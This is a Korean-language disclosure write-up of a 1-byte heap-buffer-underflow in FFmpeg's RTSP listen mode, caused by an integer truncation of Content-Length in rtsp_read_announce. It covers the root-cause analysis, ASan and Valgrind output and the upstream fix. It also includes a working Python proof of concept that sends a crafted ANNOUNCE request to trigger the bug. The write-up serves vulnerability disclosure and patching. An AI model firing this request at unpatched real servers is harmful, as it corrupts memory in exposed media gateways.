# `avformat/rtspdec`: 1-byte heap-buffer-underflow in `rtsp_read_announce`

FFmpeg는 거의 모든 컨테이너·코덱·프로토콜을 다 다루는, 멀티미디어 분야에서 사실상 표준에 가까운 오픈소스 라이브러리다. 클라이언트 단말뿐 아니라 서버·게이트웨이·트랜스코더·녹화 파이프라인에 광범위하게 박혀 있어서 외부 노출 면적이 상당히 넓다.

평소처럼 `libavformat`의 RTSP 처리 코드를 보고 있다가 `-rtsp_flags listen`이라는 옵션이 눈에 들어왔다. ffmpeg가 RTSP 클라이언트로 동작하는 흔한 케이스 말고, 반대로 **서버처럼 동작하면서 클라이언트의 요청을 받는** 모드다. 미디어 게이트웨이나 recording proxy 시나리오에서 쓰인다. 그러면 이 모드에선 클라가 보낸 메시지를 어떻게 파싱하는지가 궁금해져서, `rtsp_listen()`과 그 안에서 호출되는 `rtsp_read_announce()`로 들어가서 알아보게 됐다. 거기서 `Content-Length`를 처리하는 한 줄을 보다가 한 군데가 좀 이상해 보였다.

## 취약 코드

`libavformat/rtspdec.c`의 `rtsp_read_announce()`. 단순화하면 이런 모양이다.

```c
// libavformat/rtspdec.c
if (request.content_length) {
    sdp = av_malloc(request.content_length + 1);   // line 195
    // ... 본문 읽어서 sdp 채움 ...
    sdp[request.content_length] = '\0';            // line 208
}
```

`request.content_length`는 `int`이고, 그 값은 `ff_rtsp_parse_line()` 안에서 `strtol()`로 헤더를 파싱한 결과가 그대로 들어간다.

## 분석

aarch64 Linux는 LP64라서 `int`는 32-bit, `long`은 64-bit. 그리고 `strtol()`은 `long`을 반환한다.

클라가 `Content-Length: 4294967295`를 보내면 `strtol()`은 일단 `4294967295L`을 그대로 돌려준다 — 64-bit long에는 정상으로 들어가는 값이라 여기서는 사고가 안 난다. 사고는 그 결과를 `int` 필드로 대입하는 순간이다. 32-bit로 잘리면서 비트 패턴이 `0xFFFFFFFF`이 되고, signed int로 해석되면 **`-1`**이 된다.

이제 `request.content_length == -1`인 상태가 됐다. 0이 아니므로 `if (request.content_length)` 분기는 정상적으로 통과하고, 그대로 `av_malloc(content_length + 1)` — 즉 `av_malloc(0)`이 호출된다.

상식적으로는 `av_malloc(0)`이 NULL을 줘야 할 것 같지만, FFmpeg의 `av_malloc()`은 그렇게 동작하지 않는다. `libavutil/mem.c`를 보면 zero-size 요청에 대해 폴백 경로로 작은 할당을 돌려주게 되어 있고, 이 빌드(`posix_memalign` 경로)에서는 정확히 **1바이트 영역**이 떨어진다. 그러니까 `sdp`는 NULL이 아니라 유효한 1바이트 영역을 가리키는 포인터다.

그 상태에서 라인 208이 실행되면 `sdp[request.content_length]`는 결국 `sdp[-1]`. `sdp`가 가리키는 1바이트 영역의 **시작 주소 직전 1바이트**에 NUL이 박힌다. 이게 1-byte heap-buffer-underflow다.

## PoC

별도 미디어 파일은 필요 없다. RTSP `ANNOUNCE` 요청 한 번이 전부.

```python
#!/usr/bin/env python3
import argparse, socket

p = argparse.ArgumentParser()
p.add_argument("host", nargs="?", default="127.0.0.1")
p.add_argument("port", nargs="?", type=int, default=8554)
p.add_argument("--value", default="4294967295")
p.add_argument("--path", default="poc")
p.add_argument("--body", default="v=0\r\n")
args = p.parse_args()

req = (
    f"ANNOUNCE rtsp://{args.host}:{args.port}/{args.path} RTSP/1.0\r\n"
    f"CSeq: 1\r\n"
    f"Content-Type: application/sdp\r\n"
    f"Content-Length: {args.value}\r\n"
    f"\r\n"
).encode("latin1") + args.body.encode("latin1")

s = socket.socket(); s.connect((args.host, args.port)); s.sendall(req)
print(s.recv(4096).decode("latin1", "ignore"))
s.close()
```

서버 쪽:

```bash
./ffmpeg_g -rtsp_flags listen -listen_timeout 10 \
           -i rtsp://127.0.0.1:8579/poc -f null -
```

PoC 한 번 던지면 끝. `ANNOUNCE`만 받으면 트리거된다.

## ASan 출력

ASan은 정확히 우리 분석대로 1바이트 영역의 왼쪽 1바이트 자리를 가리킨다.

```text
==14140==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa8e006cf
WRITE of size 1 at 0xffffa8e006cf thread T0
    #0 rtsp_read_announce  libavformat/rtspdec.c:208
    #1 rtsp_listen         libavformat/rtspdec.c:817
    #2 rtsp_read_header    libavformat/rtspdec.c:860
    #3 avformat_open_input libavformat/demux.c:323
    ...

0xffffa8e006cf is located 1 bytes to the left of 1-byte region
[0xffffa8e006d0,0xffffa8e006d1)
allocated by thread T0 here:
    #0 __interceptor_posix_memalign
    #1 av_malloc            libavutil/mem.c:107
    #2 av_malloc            libavutil/mem.c:146
    #3 rtsp_read_announce   libavformat/rtspdec.c:195
```

읽어보면:

- write 주소: `0xffffa8e006cf`
- 할당 영역: `[0xffffa8e006d0, 0xffffa8e006d1)` — 정확히 1바이트
- write 위치는 영역 시작보다 1바이트 앞 → "1 bytes to the left of 1-byte region"
- write의 콜스택은 `:208`, allocation의 콜스택은 `:195`

코드 분석과 정확히 일치한다.

## Valgrind 결과

ASan 없는 별도 debug 빌드에서 Memcheck로도 돌렸다. 같은 underflow가 잡히고, Valgrind는 동일한 사실을 다른 워딩으로 보고한다("1 byte before a block of size 1").

```text
==27946== Invalid write of size 1
==27946==    at 0x8D66D4: rtsp_read_announce (rtspdec.c:208)
...
==27946==  Address 0x52b4eef is 1 bytes before a block of size 1 alloc'd
==27946==    by 0x19AA667: av_malloc (mem.c:107)
==27946==    by 0x19AA69B: av_malloc (mem.c:146)
==27946==    by 0x8D6643: rtsp_read_announce (rtspdec.c:195)
```

여기서 Valgrind가 추가로 잡아주는 게 있다. 그 1바이트 underflow 외에도, 직후 코드 경로에서 **uninitialised value 3건**이 더 보고된다.

라인 209 — `av_log` 경로 안의 `strlen`이 uninit 메모리를 읽는다.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x486B2A8: __GI_strlen
==27946==    by ... __vfprintf_internal / vsnprintf
==27946==    by ... av_vbprintf / format_line / av_log_default_callback
==27946==    by 0x8D66EF: rtsp_read_announce (rtspdec.c:209)
```

라인 210 — `ff_sdp_parse()` 안의 `strspn`도 동일한 uninit 영역 위에서 conditional jump.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x4870478: strspn
==27946==    by 0x8CF8EB: ff_sdp_parse (rtsp.c:761)
==27946==    by 0x8D66FB: rtsp_read_announce (rtspdec.c:210)
```

정리하면 — 핵심 primitive는 라인 208의 `sdp[-1] = '\0'` 1바이트지만, 그 자리에서 끝나는 게 아니다.

- 라인 208 — `sdp[-1]`에 NUL 1바이트 박힘 (실제 underflow)
- 라인 209 — 그 뒤 `av_log()` 호출 경로의 포맷 처리 중 `strlen`이 NUL 종료 안 된 영역을 읽음
- 라인 210 — `ff_sdp_parse()`가 같은 영역 위에서 `strspn` 등을 돌리며 conditional jump

즉 1바이트 손상 자체로 끝나지 않고, 그 직후 로깅·SDP 파싱 경로 전체가 unsanitized 메모리에 의해 휩쓸린다. "1바이트라 별것 아니네" 하기엔 후속 흐름이 산만한 케이스.

## 패치

upstream 픽스 방향은 단순하다 — `Content-Length`를 파싱한 뒤 음수/0을 단일 사이트에서 거부. 어차피 `av_malloc(0)`은 의미 없는 케이스고, 음수는 더더욱.

merge 후로는 `Content-Length: 4294967295`(또는 어떤 식으로든 negative로 wrap 되는 값)는 `AVERROR_INVALIDDATA`로 일찍 거절된다.

→ [FFmpeg PR #22902](https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22902)

## 1바이트 NUL이 진짜로 위험한가?

이 글에선 exploitation까지는 안 갔다. 1바이트 NUL underflow의 천장은 상황에 강하게 의존한다 — 어디 glibc chunk 헤더 옆에 떨어지느냐, glibc 버전, `MALLOC_ARENA_*`, free chunk와의 인접성 등등. 거기까지 가지 않아도 다음 두 가지는 분명하다.

1. 분명한 메모리 손상이고, ASan과 Valgrind가 모두 동의한다.
2. 손상 직후 `av_log` / `ff_sdp_parse`가 같은 영역을 추가로 읽어 unsanitized 데이터가 logging/parsing 흐름으로 흘러간다.

RTSP listen mode가 외부 노출 모드(미디어 게이트웨이, recording proxy 등)로 운용되는 케이스가 적지 않으니, 프로토콜 레벨에서 단 한 번의 `ANNOUNCE`로 트리거된다는 사실 자체가 충분히 시사적이다.

---

링크
- PR: <https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22902>
- File: `libavformat/rtspdec.c`
